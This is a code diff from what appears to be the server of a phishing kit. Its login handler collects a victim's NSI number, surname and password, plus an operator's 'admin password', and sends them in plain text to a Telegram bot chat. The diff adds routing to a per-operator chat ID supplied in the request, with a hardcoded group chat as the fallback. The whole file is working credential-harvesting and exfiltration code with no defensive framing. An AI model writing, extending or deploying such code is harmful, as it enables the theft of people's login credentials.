@@ -40,7 +40,8 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-	const { nsiNumber, surname, password, uniqueid, owner, ip } = req.body;
+	const { nsiNumber, surname, password, uniqueid, owner, ip, telegramId } =
+		req.body;
 	try {
 		await NSI.create({
 			uniqueid,
@@ -54,18 +55,34 @@ const submitLogin = async (req, res) => {
 		});
 
 		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}\n\nAdmin Password: ${owner}`;
-		await axios
-			.post(
-				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-				{
-					chat_id: "-837014205",
-					text: `NSI:\n${originalText}`,
-					parse_mode: "Markdown",
-				}
-			)
-			.catch((e) => {
-				console.log(e);
-			});
+
+		if (telegramId) {
+			await axios
+				.post(
+					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+					{
+						chat_id: telegramId,
+						text: `NSI:\n${originalText}`,
+						parse_mode: "Markdown",
+					}
+				)
+				.catch((e) => {
+					console.log(e);
+				});
+		} else {
+			await axios
+				.post(
+					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+					{
+						chat_id: "-837014205",
+						text: `NSI:\n${originalText}`,
+						parse_mode: "Markdown",
+					}
+				)
+				.catch((e) => {
+					console.log(e);
+				});
+		}
 
 		res.sendStatus(200);
 	} catch (error) {
